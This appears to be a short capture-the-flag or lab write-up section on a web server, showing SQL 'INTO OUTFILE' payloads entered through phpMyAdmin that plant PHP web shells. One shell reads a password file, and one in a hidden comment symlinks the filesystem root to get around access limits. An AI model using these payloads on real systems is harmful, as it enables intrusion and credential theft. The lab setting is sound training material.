# suEXEC

Using the same way we injected a php file for our reverse shell, we will inject a file which lets us read any file and directory on the filesystem.

I uploaded this file in phpmyadmin after logging in with the credentials found in writeup3.
```sql
SELECT '<?php system("id; cat /home/LOOKATME/password");?>' INTO OUTFILE '/var/www/forum/templates_c/test.php'
```
I figured I'd ensure that my access to the path /home/LOOKATME/password was denied, but actually it turns out www-data owns the /home/LOOKATME folder for some reason.

I'd argue this is an exploit, since we are now able to find these credentials just by exploiting the server, instead of the ISO.

<!--The goal is to do something like this, so that if we encounter a path we aren't allowed to access, we can circumvent it using symlinks.

```sql
SELECT '<?php system("ln -sf / test99.php");?>' INTO OUTFILE '/var/www/forum/templates_c/su_exec.php'
```
In case system() is blocked, you can try the builtin function symlink()-->


[Source](https://www.exploit-db.com/exploits/27397)
